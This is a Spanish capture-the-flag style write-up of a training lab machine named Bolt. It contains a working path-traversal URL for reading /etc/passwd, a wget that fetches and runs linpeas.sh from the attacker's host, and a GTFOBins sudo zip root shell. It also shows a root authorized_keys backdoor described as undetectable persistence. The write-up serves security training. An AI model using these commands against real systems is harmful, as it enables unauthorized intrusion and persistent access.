---
title: Bolt Writeup - Pentester Mentor Junior (PMJ)
date: 2026-07-11
categories:
  - Writeup
  - PMJ
tags:
  - Writeup
  - PMJ
  - Linux
image: /assets/img/commons/BoltWriteup/bolt_banner.png
---

En esta ocasión estaré resolviendo la máquina **Bolt**, una máquina Linux de dificultad **Media** perteneciente a la certificación **Pentester Mentor Junior (PMJ)** de la academia **Hacker Mentor**.

El objetivo de este laboratorio es enumerar los servicios expuestos, aprovechar un **Local File Inclusion (Path Traversal)** en un CMS llamado **BoltWire** para leer archivos del sistema, montar un recurso **NFS mal configurado** para obtener un backup con credenciales, y finalmente escalar privilegios abusando de un binario permitido por `sudo` sin contraseña.

# Reconocimiento

Lo primero que hice fue verificar que la máquina objetivo estuviera activa dentro de la red.

```
ping 192.168.68.67
```

# Escaneo

## Primer escaneo de servicios y versiones

Lancé un primer escaneo con `nmap` para identificar los puertos abiertos, los servicios corriendo en ellos y sus versiones.

```bash
sudo nmap -sVC -v --min-rate 6000 -p22,80,111,2049,8080,31917,35121,57027,58509 192.168.68.67 -oA Opcion1
```

![escaneo_puertos_opcion1](/assets/img/commons/BoltWriteup/escaneo_puertos_opcion1.png)

En los resultados noté algo interesante: aparecían servicios de **nfs** y **mountd** asociados al puerto **2049**, pero al momento del escaneo ese puerto no mostraba mayor información directamente. Esto me dio la sospecha de que podía existir algún recurso compartido a través de NFS que valdría la pena revisar más adelante.

## Escaneo con scripts de categoría vuln

Para profundizar, lancé un segundo escaneo utilizando los scripts NSE de categoría `vuln` sobre todos los puertos:

```bash
sudo nmap -sV --script vuln -v --min-rate 6000 -p22,80,111,2049,8080,31917,35121,57027,58509 192.168.68.67 -oA scan02
```

![escaneo_scripts_vuln](/assets/img/commons/BoltWriteup/escaneo_scripts_vuln.png)

Este escaneo me mostró un posible exploit relacionado con la versión de Apache (CVE-2019-9517, entre otros hallazgos de `vulners`), y algo que me pareció más relevante para seguir investigando: el script `http-enum` reportó una carpeta `/dev/` como **potencialmente interesante**.

## Enumeración puntual del puerto 8080

Como parte del mismo escaneo detecté un segundo servicio HTTP corriendo en el puerto **8080**, así que lo enumeré de forma específica:

```bash
sudo nmap -sV --script=http-enum --min-rate 6000 -vv -p8080 192.168.68.67
```

![escaneo_http_enum_8080](/assets/img/commons/BoltWriteup/escaneo_http_enum_8080.png)

Este escaneo confirmó nuevamente **Apache httpd 2.4.38 (Debian)** corriendo en el puerto 8080, con la misma carpeta `/dev/` marcada como interesante por `http-enum`.

# Enumeración

## Fuzzing de directorios

Con dos servicios web disponibles (puerto 80 y puerto 8080), hice fuzzing sobre ambos usando `gobuster`:

```bash
gobuster dir -u http://192.168.68.67/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
gobuster dir -u http://192.168.68.67:8080/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
```

## Hallazgo de credenciales expuestas

Entre los resultados del fuzzing sobre el puerto 80, di con un archivo de configuración expuesto en `/app/cache/config-cache.json`. Al abrirlo, encontré las credenciales completas de la base de datos de la aplicación:

![config_cache_json](/assets/img/commons/BoltWriteup/config_cache_json.png)

```json
"database": {
    "driver": "pdo_sqlite",
    "host": "localhost",
    "dbname": "bolt",
    "prefix": "bolt_",
    "databasename": "bolt",
    "username": "bolt",
    "password": "I_love_java",
    "user": "bolt",
    "path": "/var/www/html/app/database/bolt.db"
}
```

Esta información no resultó determinante para este caso en particular, pero anoté la contraseña `I_love_java` ya que en un entorno real (y como terminé confirmando más adelante) este tipo de credenciales suelen reutilizarse en otros servicios.

## Información adicional filtrada (phpinfo)

En otra de las rutas descubiertas encontré una página de `phpinfo()`, la cual, aunque no aportó una vía directa de explotación, sí filtró información valiosa como la versión de PHP (**7.3.27-1~deb10u1**), la ruta del `DOCUMENT_ROOT`, y la IP interna del servidor (`SERVER_NAME` / `SERVER_ADDR`: `192.168.68.67`), algo que en un entorno real según me han comentado algunos profesores puede ser bastante útil para un atacante.

![phpinfo_filtrado](/assets/img/commons/BoltWriteup/phpinfo_filtrado.png)

## Descubrimiento del CMS BoltWire

Siguiendo con el fuzzing, en la ruta `/dev/` del puerto 8080 encontré un panel de **login**. Lo interesante es que, si bien no contaba con credenciales para iniciar sesión, sí tenía disponible la opción de **registrar un nuevo usuario**.

![login_boltwire](/assets/img/commons/BoltWriteup/login_boltwire.png)

Al registrarme y acceder, identifiqué que se trataba de un CMS llamado **BoltWire**.

![panel_boltwire](/assets/img/commons/BoltWriteup/panel_boltwire.png)

# Explotación

## Path Traversal (Local File Inclusion) en BoltWire

Ya autenticado dentro de BoltWire, noté que la aplicación manejaba un parámetro `action=` de forma directa en la URL, lo cual me hizo sospechar de un posible **Path Traversal**. Confirmé esta sospecha buscando en Exploit-DB, donde encontré un exploit público específico para esta versión: **BoltWire 6.03 - Local File Inclusion** (EDB-ID: 48411).

![exploitdb_boltwire_lfi](/assets/img/commons/BoltWriteup/exploitdb_boltwire_lfi.png)

Según el exploit, era posible navegar a una ruta como la siguiente, estando autenticado, para leer archivos arbitrarios del sistema:

```
http://192.168.68.67:8080/dev/index.php?p=action.search&action=../../../../../../etc/passwd
```

Probé primero contra `/etc/group` y luego contra `/etc/passwd`:

![lfi_etc_group](/assets/img/commons/BoltWriteup/lfi_etc_group.png)

![lfi_etc_passwd](/assets/img/commons/BoltWriteup/lfi_etc_passwd.png)

La explotación funcionó correctamente, obteniendo el contenido completo de `/etc/passwd`.

Revisando el archivo, y sabiendo que normalmente los usuarios "reales" del sistema son los que terminan en `/bin/bash`, identifiqué dos usuarios de interés: **root** y **jeanpaul**.

## Revisión del servicio NFS (puerto 2049)

Retomando la sospecha inicial sobre el puerto 2049, decidí enumerarlo específicamente con los scripts de NFS de `nmap`:

```bash
sudo nmap --script nfs* -v IP
```

![nmap_scripts_nfs](/assets/img/commons/BoltWriteup/nmap_scripts_nfs.png)

Esto confirmó que el servidor exponía un recurso vía `nfs-showmount` en la ruta `/srv/nfs`, accesible desde los rangos `172.16.0.0/12`, `10.0.0.0/8` y `192.168.0.0/16` — es decir, prácticamente cualquier red privada, incluida la mía. Además, el script `nfs-ls` ya me dejaba ver un archivo llamado `save.zip` dentro de ese recurso.

Confirmé que el recurso era accesible externamente desde mi máquina. Este es un fallo bastante común: muchos NAS y servidores NFS vienen configurados por defecto priorizando la disponibilidad para compartir archivos, sin restricciones de seguridad adicionales.

Para reforzar este hallazgo, validé la información con otras herramientas:

```bash
rpcclient 192.168.68.67 -N
showmount -a 192.168.68.67
showmount -e 192.168.68.67
```

![showmount_confirmacion](/assets/img/commons/BoltWriteup/showmount_confirmacion.png)

## Montaje del recurso NFS

Creé una carpeta local para montar el recurso compartido:

```bash
mkdir nfs
```

![carpeta_nfs_vacia](/assets/img/commons/BoltWriteup/carpeta_nfs_vacia.png)

Y lo monté apuntando a la ruta exportada por el servidor:

```bash
sudo mount -t nfs 192.168.68.67:/srv/nfs /home/hmstudent/Desktop/bolt/nfs
```

![montaje_nfs](/assets/img/commons/BoltWriteup/montaje_nfs.png)

Algo importante a tener en cuenta aquí: mientras el recurso sigue montado de esta forma remota, cualquier interacción queda expuesta ante el servidor de origen. Trabajar directamente ahí implica riesgos (falta de privilegios, espacio limitado, y la posibilidad de que alguien monitoreando el NAS reciba una alerta), así que lo más sano es **copiar el contenido a un directorio local** antes de manipularlo.

```bash
cp nfs/save.zip .
```

![copia_save_zip_local](/assets/img/commons/BoltWriteup/copia_save_zip_local.png)

## Análisis y crackeo del archivo save.zip

Con el archivo ya en local, revisé su contenido sin extraerlo todavía:

```bash
unzip -l save.zip
```

![listado_save_zip](/assets/img/commons/BoltWriteup/listado_save_zip.png)

El archivo contenía tres elementos: `bandera1.txt`, `id_rsa` y `todo.txt`. Al intentar extraerlo directamente, la aplicación me pidió una contraseña:

```bash
unzip save.zip
```

![zip_solicita_password](/assets/img/commons/BoltWriteup/zip_solicita_password.png)

No contaba con la contraseña, así que intenté crackearla con `fcrackzip` (más rápido que `john` específicamente para este tipo de archivos):

```bash
sudo apt install fcrackzip
fcrackzip -v -u -D -p /usr/share/wordlists/rockyou.txt save.zip
```

![fcrackzip_resultado](/assets/img/commons/BoltWriteup/fcrackzip_resultado.png)

Obtuve la contraseña: **`java101`**. Con ella pude extraer el contenido del `.zip` sin problema:

```bash
unzip save.zip
```

![extraccion_exitosa_zip](/assets/img/commons/BoltWriteup/extraccion_exitosa_zip.png)

## Acceso por SSH con la clave privada encontrada

Dentro de los archivos extraídos encontré una llave privada SSH (`id_rsa`) y, revisando `todo.txt`, un posible usuario llamado **"jp"**, que me recordó de inmediato al usuario `jeanpaul` visto anteriormente en `/etc/passwd`.

```bash
cat id_rsa
```

![contenido_id_rsa](/assets/img/commons/BoltWriteup/contenido_id_rsa.png)

Ajusté los permisos de la llave e intenté conectarme:

```bash
chmod 600 id_rsa
ssh -i id_rsa jeanpaul@192.168.68.67
```

La llave estaba protegida con una passphrase. Probé con la contraseña que había encontrado antes durante el fuzzing (`I_love_java`), confirmando que efectivamente se trataba de una reutilización de credenciales.

![conexion_ssh_jeanpaul](/assets/img/commons/BoltWriteup/conexion_ssh_jeanpaul.png)

Con esto obtuve acceso al sistema como el usuario `jeanpaul`.

# Escalada de privilegios

## Enumeración con LinPEAS

Ya dentro como `jeanpaul`, transferí `linpeas.sh` al sistema apoyándome en un servidor web levantado en mi Kali:

```bash
cd /dev/shm
wget http://192.168.68.72/linpeas.sh
chmod +x *
./linpeas.sh
```

![descarga_linpeas](/assets/img/commons/BoltWriteup/descarga_linpeas.png)

Revisando la salida, encontré rápidamente algo que llamó mi atención: el usuario `jeanpaul` tenía permiso para ejecutar un binario como `root` sin necesidad de contraseña.

![linpeas_sudo_zip](/assets/img/commons/BoltWriteup/linpeas_sudo_zip.png)

También noté un par de archivos relacionados con la configuración de **MariaDB** (`mariadb.cnf` y `debian.cnf`), que dejé anotados por si resultaban útiles más adelante, aunque no terminé necesitándolos para escalar. Finalmente, LinPEAS también me confirmó la ubicación de la segunda bandera del reto, dentro del directorio personal de `jeanpaul`.

![linpeas_mariadb_bandera2](/assets/img/commons/BoltWriteup/linpeas_mariadb_bandera2.png)

## Confirmación del permiso sudo

Verifiqué directamente los privilegios de `sudo` del usuario:

```bash
sudo -l
```

Esto confirmó que `jeanpaul` podía ejecutar `/usr/bin/zip` como `root`, sin contraseña (`NOPASSWD`). Sin este permiso, esta vía de escalada no habría sido posible, así que fue el punto de partida para el siguiente paso.

## Abuso de sudo sobre /usr/bin/zip (GTFOBins)

Con este hallazgo, consulté [GTFOBins](https://gtfobins.github.io/gtfobins/zip/#sudo) para la técnica correspondiente de escalada usando `zip` con privilegios de `sudo`:

```bash
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
```

![explotacion_sudo_zip](/assets/img/commons/BoltWriteup/explotacion_sudo_zip.png)

Esto me devolvió una shell como `root`. Confirmé el acceso y estabilicé la shell:

```bash
whoami
script /dev/null -c bash
```

**¡Listo, ya era root!**

## Persistencia indetectable (clave SSH para root)

Para dejar un acceso persistente y discreto, generé un nuevo par de llaves SSH en mi Kali:

```bash
ssh-keygen
```

![ssh_keygen_local](/assets/img/commons/BoltWriteup/ssh_keygen_local.png)

Con la llave pública generada, me moví en la máquina víctima —ya como `root`— hacia `/root/`, creé el directorio `.ssh` y agregué el contenido de mi llave pública al archivo `authorized_keys`:

```bash
cd /root/
mkdir .ssh
cd .ssh/
echo "ssh-rsa AAAA...resto-de-la-clave-publica... hmstudent@kali" > authorized_keys
```

![creacion_authorized_keys_root](/assets/img/commons/BoltWriteup/creacion_authorized_keys_root.png)

Finalmente, comprobé que la persistencia funcionara correctamente conectándome desde mi Kali con la llave privada recién generada:

```bash
ssh -i id_rsa root@192.168.68.67
```

![acceso_persistente_root](/assets/img/commons/BoltWriteup/acceso_persistente_root.png)

El acceso como `root` quedó confirmado, y con él pude ubicar la bandera final del reto dentro de `/root`.

# Conclusión

La máquina **Bolt** resultó ser un buen ejercicio para practicar el encadenamiento de varias fallas de configuración típicas en entornos Linux:

1. Un escaneo detallado con `nmap`, incluyendo scripts de categoría `vuln` y `http-enum`, me permitió detectar pistas tempranas (un directorio `/dev/` interesante y un puerto NFS sospechoso) que terminaron siendo claves más adelante.
2. El **fuzzing web** reveló un archivo de configuración expuesto con credenciales de base de datos, y me llevó a descubrir el CMS **BoltWire**, vulnerable a un **Local File Inclusion / Path Traversal** documentado públicamente.
3. Un servicio **NFS mal configurado**, exportado sin restricciones hacia redes privadas completas, me permitió montar un recurso remoto y extraer un backup (`save.zip`) protegido con contraseña.
4. El crackeo del `.zip` con `fcrackzip` y la **reutilización de una contraseña** encontrada previamente durante el fuzzing me permitieron usar una llave SSH filtrada para acceder como `jeanpaul`.
5. Finalmente, un permiso de `sudo` mal configurado sobre el binario `zip` (documentado en GTFOBins) me permitió escalar privilegios hasta `root`.

---

Gracias por leer este writeup.